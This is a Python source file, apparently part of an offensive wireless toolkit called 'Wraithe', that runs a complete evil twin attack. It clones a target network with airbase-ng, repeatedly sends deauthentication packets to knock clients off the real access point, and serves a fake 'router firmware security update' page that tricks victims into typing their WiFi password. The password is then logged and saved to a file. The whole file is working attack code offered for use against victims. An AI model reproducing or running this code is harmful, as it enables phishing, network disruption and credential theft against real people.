"""
Wraithe - Evil Twin Attack Module
Fake AP with captive portal, single wireless driver support
Uses airbase-ng to create AP + Python HTTP server for captive portal
"""

import subprocess
import os
import time
import re
import signal
import threading
import socket
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

class EvilTwin:
    def __init__(self, config=None, log_callback=None):
        self.config = config or {}
        self.log_callback = log_callback or (lambda x: None)
        self._running = False
        self._airbase = None
        self._httpd = None
        self._http_thread = None
        self.captured_password = None
        self.captured_data = []
        self.portal_port = 80

    def log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_callback(f'[{timestamp}] {msg}')

    def _get_ip(self):
        """Get current IP for the interface"""
        try:
            result = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=5)
            ip = result.stdout.strip().split()[0]
            if ip:
                return ip
        except:
            pass
        return '192.168.3.1'  # fallback

    def _find_gateway(self, interface):
        """Get gateway IP from interface"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if interface in line and 'default' in line:
                    return line.split()[2]
        except:
            pass
        return None

    def start_ap(self, mon_iface, essid, channel='1', bssid=None):
        """
        Start fake AP using airbase-ng (single wireless driver)
        Creates open network with target ESSID
        Returns the tap interface (at0) for further configuration
        """
        cmd = ['airbase-ng', '-e', essid, '-c', str(channel)]
        
        # Use target BSSID if provided (cloning)
        if bssid:
            cmd.extend(['-a', bssid])
        
        cmd.extend(['-P'])  # respond to probes
        cmd.extend(['-W', '1'])  # WPS (optional)
        cmd.extend([mon_iface])
        
        self.log(f'Starting fake AP: "{essid}" on {mon_iface} ch{channel}')
        self._running = True
        
        try:
            self._airbase = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN)
            )
            
            # Wait for at0 interface
            time.sleep(3)
            for _ in range(10):
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=5)
                if 'at0' in result.stdout:
                    self.log('Tap interface at0 created')
                    break
                time.sleep(1)
            
            # Configure at0 interface
            at_ip = self._get_ip().rsplit('.', 1)[0] + '.1' if self._get_ip() else '192.168.3.1'
            subprocess.run(['ifconfig', 'at0', 'up'], capture_output=True, timeout=5)
            subprocess.run(['ifconfig', 'at0', at_ip, 'netmask', '255.255.255.0'],
                          capture_output=True, timeout=5)
            
            # NAT setup
            self._setup_nat(mon_iface.replace('mon', ''), at_ip)
            
            self.log(f'Fake AP ready on at0 ({at_ip})')
            return {'success': True, 'tap': 'at0', 'ip': at_ip, 'essid': essid}
            
        except Exception as e:
            self.log(f'Error starting AP: {e}')
            return {'success': False, 'error': str(e)}

    def _setup_nat(self, upstream_iface, ap_ip):
        """Set up IP forwarding and NAT for internet access through fake AP"""
        try:
            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            # NAT with iptables
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True, timeout=5)
            subprocess.run(['iptables', '-F'], capture_output=True, timeout=5)
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'POSTROUTING',
                '-o', upstream_iface, '-j', 'MASQUERADE'
            ], capture_output=True, timeout=5)
            subprocess.run([
                'iptables', '-A', 'FORWARD', '-i', upstream_iface,
                '-o', 'at0', '-m', 'state', '--state',
                'RELATED,ESTABLISHED', '-j', 'ACCEPT'
            ], capture_output=True, timeout=5)
            subprocess.run([
                'iptables', '-A', 'FORWARD', '-i', 'at0',
                '-o', upstream_iface, '-j', 'ACCEPT'
            ], capture_output=True, timeout=5)
            
            self.log('NAT configured')
        except Exception as e:
            self.log(f'NAT setup warning: {e}')

    # ── Captive Portal ──

    class _PortalHandler(BaseHTTPRequestHandler):
        """HTTP request handler for captive portal"""
        
        # Reference to parent EvilTwin instance
        parent = None
        
        def log_message(self, format, *args):
            if self.parent:
                self.parent.log(f'[HTTP] {self.client_address[0]} - {format % args}')
        
        def do_GET(self):
            if self.parent:
                self.parent.log(f'[HTTP] GET {self.path} from {self.client_address[0]}')
            
            if self.path == '/':
                self._serve_page()
            elif self.path == '/success':
                self._serve_success()
            elif '/capture' in self.path:
                self._serve_page()  # redirect to main
            else:
                # Catch-all: serve the portal page (DNS hijack catch)
                self._serve_page()
        
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8', errors='replace')
            
            if self.parent:
                self.parent.log(f'[HTTP] POST {self.path} data: {body}')
                self.parent.captured_data.append({
                    'timestamp': datetime.now().isoformat(),
                    'client': self.client_address[0],
                    'path': self.path,
                    'data': body
                })
            
            # Parse form data
            password = None
            for part in body.split('&'):
                if '=' in part:
                    k, v = part.split('=', 1)
                    from urllib.parse import unquote
                    v = unquote(v)
                    if any(x in k.lower() for x in ['password', 'pass', 'pwd', 'key', 'wpa', 'wifi']):
                        password = v
                    elif 'submit' in k.lower():
                        continue
            
            if password:
                self.parent.captured_password = password
                if self.parent:
                    self.parent.log(f'[!!!] PASSWORD CAPTURED: {password}')
                self._serve_success()
            else:
                # Check all fields
                if body and self.parent:
                    self.parent.log(f'[DATA] {body}')
                self._serve_success()
        
        def _serve_page(self):
            """Serve the phishing page - router upgrade style"""
            html = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Network Security Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
  body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
  .card { background: white; border-radius: 16px; padding: 40px; width: 380px; max-width: 90vw; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
  .logo { text-align: center; margin-bottom: 24px; }
  .logo .icon { font-size: 48px; }
  .logo h1 { font-size: 18px; color: #333; margin-top: 8px; }
  .logo p { font-size: 13px; color: #888; margin-top: 4px; }
  .warning { background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 13px; color: #856404; }
  .warning strong { display: block; margin-bottom: 4px; }
  label { display: block; font-size: 13px; color: #555; margin-bottom: 4px; font-weight: 500; }
  input { width: 100%; padding: 12px 16px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; margin-bottom: 16px; transition: border 0.2s; }
  input:focus { border-color: #667eea; outline: none; }
  button { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.1s; }
  button:hover { transform: translateY(-1px); }
  button:active { transform: translateY(0); }
  .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #aaa; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <div class="icon">&#9888;</div>
    <h1>Network Security Update Required</h1>
    <p>Firmware update required for stable connection</p>
  </div>
  <div class="warning">
    <strong>&#9888; Security Notice</strong>
    Your router firmware is outdated. Please enter your WiFi password below to apply the security patch and reconnect.
  </div>
  <form method="POST" action="/">
    <label for="password">WiFi Password / Network Key</label>
    <input type="password" id="password" name="password" placeholder="Enter your WiFi password" required autocomplete="off">
    <button type="submit">Apply Update &amp; Reconnect</button>
  </form>
  <div class="footer">Router firmware v2.4.1 - Security patch required</div>
</div>
</body>
</html>"""
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(html.encode())))
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            self.wfile.write(html.encode())
        
        def _serve_success(self):
            html = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Update Applied</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
  body { background: linear-gradient(135deg, #11998e, #38ef7d); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
  .card { background: white; border-radius: 16px; padding: 40px; width: 380px; max-width: 90vw; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }
  .icon { font-size: 64px; margin-bottom: 16px; }
  h1 { font-size: 20px; color: #333; margin-bottom: 8px; }
  p { font-size: 14px; color: #666; }
  .spinner { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top-color: #11998e; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
  <div class="icon">&#9889;</div>
  <h1>Update Applied Successfully</h1>
  <p>Your router firmware has been updated.<br>Reconnecting to network...</p>
  <div class="spinner"></div>
</div>
</body>
</html>"""
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(html.encode())))
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            self.wfile.write(html.encode())

    def start_portal(self, port=80):
        """Start the captive portal HTTP server"""
        self.portal_port = port
        self._PortalHandler.parent = self
        
        # Try port 80 first, fall back
        for p in [port, 8080, 8888, 8000]:
            try:
                self._httpd = HTTPServer(('0.0.0.0', p), self._PortalHandler)
                self.portal_port = p
                break
            except OSError:
                continue
        else:
            self.log('Failed to start HTTP server on any port')
            return False
        
        self._http_thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._http_thread.start()
        self.log(f'Captive portal running on port {self.portal_port}')
        return True

    def run(self, mon_iface, essid, bssid, channel='1', deauth_count=10,
            portal_port=80, timeout=300):
        """
        Full evil twin attack:
        1. Start fake AP with target ESSID
        2. Start captive portal
        3. Deauth real AP to push clients to fake AP
        4. Wait for credentials
        """
        self.log(f'=== Evil Twin Attack: "{essid}" ===')
        self.log(f'Using single interface: {mon_iface}')
        
        # Step 1: Start fake AP
        ap_result = self.start_ap(mon_iface, essid, channel, bssid)
        if not ap_result.get('success'):
            self.log('Failed to start fake AP')
            return {'success': False, 'error': 'AP startup failed'}
        
        # Step 2: Start captive portal
        if not self.start_portal(portal_port):
            self.log('Failed to start captive portal')
            self.stop()
            return {'success': False, 'error': 'Portal failed'}
        
        ap_ip = ap_result.get('ip', '192.168.3.1')
        self.log(f'Captive portal: http://{ap_ip}:{self.portal_port}')
        print(f"\n  [*] Captive portal: http://{ap_ip}:{self.portal_port}")
        print(f"  [*] Point victims here to capture credentials")
        
        # Step 3: Deauth the real AP to push clients
        self.log(f'Sending {deauth_count} deauth packets to push clients...')
        try:
            for _ in range(3):
                subprocess.run(
                    ['aireplay-ng', '-0', str(deauth_count), '-a', bssid,
                     '--ignore-negative-one', mon_iface],
                    capture_output=True, text=True, timeout=20
                )
                time.sleep(2)
        except:
            pass
        
        # Step 4: Wait for credentials
        self.log('Waiting for victims to connect and enter password...')
        print(f"\n  [*] Waiting for credentials... (Ctrl+C to stop)")
        
        start_time = time.time()
        try:
            while time.time() - start_time < timeout and self._running:
                time.sleep(1)
                
                if self.captured_password:
                    self.log(f'[!!!] PASSWORD CAPTURED: {self.captured_password}')
                    print(f"\n  ============== PASSWORD CAPTURED ==============")
                    print(f"  Password: {self.captured_password}")
                    print(f"  ===============================================")
                    
                    # Log to file
                    log_file = f'/tmp/wraithe_logs/evil_twin_{bssid.replace(":", "")}_{int(time.time())}.txt'
                    os.makedirs('/tmp/wraithe_logs', exist_ok=True)
                    with open(log_file, 'w') as f:
                        f.write(f"Target ESSID: {essid}\n")
                        f.write(f"Target BSSID: {bssid}\n")
                        f.write(f"Captured Password: {self.captured_password}\n")
                        f.write(f"Time: {datetime.now().isoformat()}\n")
                    self.log(f'Saved to {log_file}')
                    
                    self.stop()
                    return {
                        'success': True,
                        'password': self.captured_password,
                        'essid': essid,
                        'bssid': bssid,
                        'data': self.captured_data,
                        'file': log_file,
                    }
                
                # Show connected clients periodically
                if int(time.time() - start_time) % 10 == 0:
                    result = subprocess.run(
                        ['arp', '-a'], capture_output=True, text=True, timeout=5
                    )
                    clients = [l for l in result.stdout.split('\n') if l.strip()]
                    if clients:
                        self.log(f'Connected clients: {len(clients)}')
                
                elapsed = int(time.time() - start_time)
                if elapsed % 30 == 0:
                    self.log(f'Still waiting... ({elapsed}s elapsed)')
                    # Send periodic deauth to keep pushing
                    subprocess.run(
                        ['aireplay-ng', '-0', '5', '-a', bssid,
                         '--ignore-negative-one', mon_iface],
                        capture_output=True, text=True, timeout=10
                    )
        
        except KeyboardInterrupt:
            self.log('Evil twin stopped by user')
        
        self.stop()
        return {
            'success': False,
            'password': None,
            'essid': essid,
            'data': self.captured_data,
        }

    def stop(self):
        self._running = False
        if self._httpd:
            self._httpd.shutdown()
            self._httpd = None
        if self._airbase:
            self._airbase.terminate()
            try:
                self._airbase.wait(timeout=5)
            except:
                self._airbase.kill()
            self._airbase = None
        
        # Cleanup at0 and iptables
        subprocess.run(['ifconfig', 'at0', 'down'], capture_output=True, timeout=5)
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True, timeout=5)
        subprocess.run(['iptables', '-F'], capture_output=True, timeout=5)
        
        self.log('Evil twin stopped, cleaned up')

    def is_running(self):
        return self._running
